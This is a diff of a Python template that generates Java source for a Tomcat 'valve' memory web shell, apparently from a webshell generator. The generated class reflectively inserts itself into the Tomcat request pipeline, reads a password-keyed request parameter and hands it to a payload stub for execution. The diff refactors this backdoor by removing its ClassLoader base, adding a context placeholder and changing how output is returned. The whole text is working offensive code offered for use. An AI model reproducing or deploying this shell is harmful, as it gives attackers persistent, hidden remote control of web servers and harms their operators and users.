@@ -1,21 +1,19 @@
 code = """
 import java.lang.reflect.*;
-import java.util.ArrayList;
+import java.util.*;
 
-public class TomcatValve extends ClassLoader implements InvocationHandler {{
+public class TomcatValve implements InvocationHandler {{
     private static String password = "{password}";
     private static Object nextvalve = null;
 {common}
+{context}
 {decoder}
 {stub}
     private void hook(Object request, Object response) throws Exception {{
         String payload = (String) invokeMethod(
             request, "getParameter", password
         );
-        invokeMethod(
-            invokeMethod(response, "getWriter"),
-                "write", stub(payload, request, response)
-        );
+        stub(payload, request, response);
     }}
 
     @Override
@@ -41,11 +39,11 @@ public class TomcatValve extends ClassLoader implements InvocationHandler {{
         return null;
     }}
 
-    private void addValve(Object proxyObject)
-            throws InvocationTargetException, IllegalAccessException {{
+    private void addValve(Object proxyObject) throws Exception {{
         Object context = getStandardContext();
         Object pipeline = invokeMethod(context, "getPipeline");
-        getMethodX(pipeline.getClass(), "addValve", 1).invoke(pipeline, proxyObject);
+        getMethodX(pipeline.getClass(), "addValve", 1)
+            .invoke(pipeline, proxyObject);
     }}
 
     public TomcatValve() {{
@@ -68,10 +66,6 @@ public class TomcatValve extends ClassLoader implements InvocationHandler {{
                 }} catch (Exception e) {{}}
             }}
         }}
-    }}
-
-    public TomcatValve(ClassLoader loader) {{
-        super(loader);
     }}
 
     static {{
